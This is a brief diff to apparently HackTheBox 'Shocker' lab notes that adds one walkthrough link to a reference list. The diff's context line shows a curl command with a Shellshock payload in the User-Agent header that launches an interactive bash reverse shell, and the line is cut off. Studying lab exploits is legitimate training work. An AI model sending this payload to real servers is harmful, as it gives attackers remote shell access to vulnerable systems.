@@ -52,6 +52,7 @@ curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >
 # References & Alternatives:
 + https://vvmlist.github.io/#shock
 + https://0xdf.gitlab.io/2021/05/25/htb-shocker.html
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/shocker-writeup-w-o-metasploit
 + https://infosecwriteups.com/shocker-from-hackthebox-52378519fb5b
 + https://corruptedprotocol.medium.com/shocker-hackthebox-htb-2cdac3cf3562
 + https://www.linkedin.com/pulse/hack-box-htb-shocker-walkthrough-abdulhakim-öner
